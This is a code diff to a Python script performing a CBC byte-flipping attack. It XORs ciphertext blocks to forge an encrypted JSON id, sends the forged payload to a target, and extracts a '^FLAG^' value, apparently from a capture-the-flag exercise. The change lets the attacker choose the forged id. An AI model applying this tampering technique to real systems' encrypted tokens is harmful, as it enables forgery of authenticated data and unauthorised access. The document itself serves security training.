@@ -2,7 +2,13 @@ from base64 import b64encode
 from settings import CBC_BLOCKSIZE, ORIGINAL_PAYLOAD, TARGET
 from help import replace_chars, xor2bytes, make_request
 
-def byte_flip():
+def byte_flip(custom_id: str = None, return_raw = False):
+
+    if custom_id:
+        if len(custom_id) != 1:
+            raise ValueError("Only a custom id of length 1 is supported")
+    else:
+        custom_id = "1"
 
     data_of_interest_enc = []
     for block in range(5, 9+1):
@@ -17,7 +23,7 @@ def byte_flip():
     )
     data_of_interest_enc[0] = xor2bytes(
         data_of_interest_enc[0],
-        b'{"id":"1", "i":"'
+        b'{"id":"%s", "i":"'%(custom_id.encode('utf-8'))
     )
 
     # Prepare the new payload for sending
@@ -26,8 +32,11 @@ def byte_flip():
     modified_payload = modified_payload.decode('utf-8')
     modified_payload = replace_chars(modified_payload, reverse=True)
 
-    result = make_request(TARGET, modified_payload, True).text
-    result = result.split('\n')[0]
+    result = make_request(TARGET, modified_payload, True)
+    if return_raw:
+        return result
+
+    result = result.text.split('\n')[0]
     result = result[result.index('^FLAG^'): ]
     
     return result
